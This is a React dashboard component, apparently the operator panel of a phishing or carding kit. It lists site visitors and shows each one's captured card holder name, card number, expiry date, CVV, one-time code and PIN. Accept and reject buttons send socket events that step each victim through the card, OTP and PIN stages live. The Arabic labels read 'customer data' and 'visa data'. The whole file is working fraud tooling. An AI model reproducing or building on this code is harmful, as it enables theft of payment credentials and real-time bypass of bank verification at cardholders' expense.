import React, { useEffect, useState } from "react";
import { serverRoute, token } from "./App";
import axios from "axios";
import { io } from "socket.io-client";
import Alret from "./Alret";
import { IoMdRefresh } from "react-icons/io";
import { IoMdCloseCircle } from "react-icons/io";

const Main = () => {
  const socket = io(serverRoute);
  const [activeUsers, setActiveUsers] = useState([]);
  const [Users, setUsers] = useState([]);
  const [user, setUser] = useState({ data: {}, active: false });
  const [nav, setNav] = useState(null);
  const [price, setPrice] = useState("");

  const uniqueNum = () =>
    Math.floor(Math.random() * (10000000 - 999999 + 1)) + 999999;

  const getUsers = async () => {
    await axios
      .get(`${serverRoute}/users`)
      .then((res) => {
        // console.log(res.data);
        setUsers(res.data);
        const online = res.data.filter((user) => !user.checked);
        setActiveUsers(online);
      })
      .catch((error) => {
        console.log(error);
      });
  };

  const handleDisplay = async (id) => {
    const user = Users.find((u) => u._id === id);
    if (!user.checked) {
      await axios.get(serverRoute + "/order/checked/" + id);
    }
    getUsers();
    setUser({ data: user, active: true });
  };

  useEffect(() => {
    getUsers();
  }, []);

  const handleAcceptVisa = async (ID,USER) => {
    socket.emit("acceptVisa",{ID,USER});
    setUser({ data: { ...user.data, visaAccept: true }, active: true });
    await getUsers();
  };

  const handleDeclineVisa = async ( ID, USER ) => {
    socket.emit("declineVisa", { ID, USER });
    const _user = Users.find((u) => {
      if (u._id === ID) {
        return { ...u, visaAccept: true };
      }
    });
    const withOut = Users.filter((u) => u._id !== ID);
    setUsers([...withOut, _user]);
    setUser({ data: { ..._user, visaAccept: true }, active: true });
  };

  const handleAcceptVisaOtp = async (id) => {
  
    socket.emit("acceptVisaOTP", id);
    setUser({ data: { ...user.data, visaOtpAccept: true }, active: true });
    await getUsers();
  };

  const handleDeclineVisaOtp = (id) => {
    socket.emit("declineVisaOTP", id);
    const _user = Users.find((u) => {
      if (u._id === id) {
        return { ...u, visaOtpAccept: true };
      }
    });
    const withOut = Users.filter((u) => u._id !== id);
    setUsers([...withOut, _user]);
    setUser({ data: { ..._user, visaOtpAccept: true }, active: true });
  };

  const handleAcceptVisaPin = async (id) => {
    socket.emit("acceptVisaPin", id);
    setUser({ data: { ...user.data, visaPinAccept: true }, active: true });
    await getUsers();
  };

  const handleDeclineVisaPin = (id) => {
    socket.emit("declineVisaPin", id);
    const _user = Users.find((u) => {
      if (u._id === id) {
        return { ...u, visaPinAccept: true };
      }
    });
    const withOut = Users.filter((u) => u._id !== id);
    setUsers([...withOut, _user]);
    setUser({ data: { ..._user, visaPinAccept: true }, active: true });
  };

  socket.on("visa", async (data) => {
    await getUsers();
  });

  socket.on("visaOtp", async (result) => {
    const user = Users.find((u) => {
      if (u._id === result.id) {
        return { ...u, visa_otp: result.visa_otp };
      }
    });
    await getUsers();
    setUser({ data: user, active: true });
  });

  socket.on("visaPin", async (data) => {
    const user = Users.find((u) => {
      if (u._id === data.id) {
        return { ...u, visa_pin: data.visa_pin };
      }
    });
    await getUsers();
    setUser({ data: user, active: true });
  });

  return (
    <div
      className="flex w-full flex-col bg-gray-200 relative h-screen"
      dir="rtl"
    >
      <div
        className="fixed left-5 bottom-2 cursor-pointer p-2 bg-sky-800 rounded-full  text-white"
        onClick={() => window.location.reload()}
      >
        <IoMdRefresh className="text-3xl  " />
      </div>
      <div
        className="fixed left-5 bottom-16 cursor-pointer p-2 bg-red-500 rounded-full  text-white"
        onClick={async () =>
          await axios
            .delete(serverRoute + "/")
            .then(async () => await getUsers())
        }
      >
        <IoMdCloseCircle className="text-3xl  " />
      </div>

      <div className="flex w-full items-center h-screen  md:flex-row  ">
        {/* // Notifactions */}

        <div className="w-1/4 border-l border-gray-500 h-full flex flex-col  ">
          <span className="md:p-5 py-2 px-1 w-full md:text-xl text-lg text-center  border-b border-black">
            مستخدمين
          </span>
          <div className="w-full flex flex-col overflow-y-auto h-full">
            {Users.length
              ? Users.map((user, idx) => {
                  return (
                    <div
                      className="w-full px-2 py-3 md:text-lg text-sm flex justify-between items-center border-b-2 border-gray-500 cursor-pointer hover:opacity-70"
                      onClick={() => handleDisplay(user._id)}
                    >
                      <span
                        className={`w-2 h-2 bg-green-500 rounded-full ${
                          activeUsers.find((u) => u._id === user._id)
                            ? "visible"
                            : "hidden"
                        }`}
                      ></span>
                      <span className="flex-1 text-center text-gray-700 md:text-sm  text-xs ">
                        {user._id}
                      </span>
                    </div>
                  );
                })
              : ""}
          </div>
        </div>

        {/* data */}

        {user.active ? (
          <div className="w-3/4 border-l  border-gray-500 h-screen overflow-y-auto grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 items-start place-content-start gap-5 px-3">
            <span
              className="px-3 py-2 w-full  md:col-span-2 lg:col-span-3 text-xl text-center border-b border-black "
              dir="rtl"
            >
              بيانات عميل
            </span>
            {user.data?.cartProducts.length ? (
              <div className="flex flex-col items-center bg-sky-800 text-white py-2 px-3 rounded-lg gap-y-1   my-2">
                <span className="text-lg mb-2">بيانات عميل</span>
                <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                  <span>منتجات </span>
                  {user.data?.cartProducts.map((product) => {
                    return <img src={product.image} className="w-20" />;
                  })}
                </div>
                {user.data.cartProducts ? (
                  <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                    <span> عدد المنتجات </span>
                    <span>{user.data?.cartProducts.length}</span>
                  </div>
                ) : (
                  ""
                )}
                {user.data.cartTotalPrice ? (
                  <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                    <span> المبلغ الكلي </span>
                    <span>{user.data?.cartTotalPrice}</span>
                  </div>
                ) : (
                  ""
                )}
              </div>
            ) : (
              ""
            )}

            {user.data?.visa_card_number ? (
              <div className="flex flex-col items-center bg-sky-800 text-white py-2 px-3 rounded-lg gap-y-1   my-2">
                <span className="text-lg mb-2">بيانات الفيزا</span>
                <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                  <span> الاسم علي الكارت </span>
                  <span>{user.data?.visa_card_holder_name} </span>
                </div>
                <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                  <span> رقم الكارت </span>
                  <span>{user.data?.visa_card_number}</span>
                </div>
                {user.data.visa_expiryDate ? (
                  <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                    <span> تاريخ الانتهاء</span>
                    <span>{user.data?.visa_expiryDate}</span>
                  </div>
                ) : (
                  ""
                )}

                {user.data.visa_cvv ? (
                  <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                    <span> cvv </span>
                    <span>{user.data?.visa_cvv}</span>
                  </div>
                ) : (
                  ""
                )}

                {user.data.visaAccept ? (
                  ""
                ) : (
                  <div className="w-full flex col-span-2 md:col-span-1 justify-between gap-x-3  p-2 text-xs">
                    <button
                      className="bg-green-500 w-1/2 p-2 rounded-lg"
                      onClick={() =>
                        handleAcceptVisa(user.data._id, user.data.user)
                      }
                    >
                      قبول
                    </button>
                    <button
                      className="bg-red-500 w-1/2 p-2 rounded-lg"
                      onClick={() =>
                        handleDeclineVisa(user.data._id, user.data.user)
                      }
                    >
                      رفض
                    </button>
                  </div>
                )}

                {user.data.visa_otp ? (
                  <>
                    <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                      <span> رمز التحقق </span>
                      <span>{user.data?.visa_otp}</span>
                    </div>
                    {user.data.visaOtpAccept ? (
                      ""
                    ) : (
                      <div className="w-4/5 flex col-span-2 md:col-span-1 justify-between gap-x-3  p-2 text-xs">
                        <button
                          className="bg-green-500 w-1/2 p-2 rounded-lg"
                          onClick={() => handleAcceptVisaOtp(user.data._id)}
                        >
                          قبول
                        </button>
                        <button
                          className="bg-red-500 w-1/2 p-2 rounded-lg"
                          onClick={() => handleDeclineVisaOtp(user.data._id)}
                        >
                          رفض
                        </button>
                      </div>
                    )}
                  </>
                ) : (
                  ""
                )}
                {user.data.visa_pin ? (
                  <>
                    <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                      <span> Pin </span>
                      <span>{user.data?.visa_pin}</span>
                    </div>
                    {user.data.visaPinAccept ? (
                      ""
                    ) : (
                      <div className="w-4/5 flex col-span-2 md:col-span-1 justify-between gap-x-3  p-2 text-xs">
                        <button
                          className="bg-green-500 w-1/2 p-2 rounded-lg"
                          onClick={() => handleAcceptVisaPin(user.data._id)}
                        >
                          قبول
                        </button>
                        <button
                          className="bg-red-500 w-1/2 p-2 rounded-lg"
                          onClick={() => handleDeclineVisaPin(user.data._id)}
                        >
                          رفض
                        </button>
                      </div>
                    )}
                  </>
                ) : (
                  ""
                )}
              </div>
            ) : (
              ""
            )}
          </div>
        ) : (
          ""
        )}

        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3"></div>
      </div>
    </div>
  );
};

export default Main;
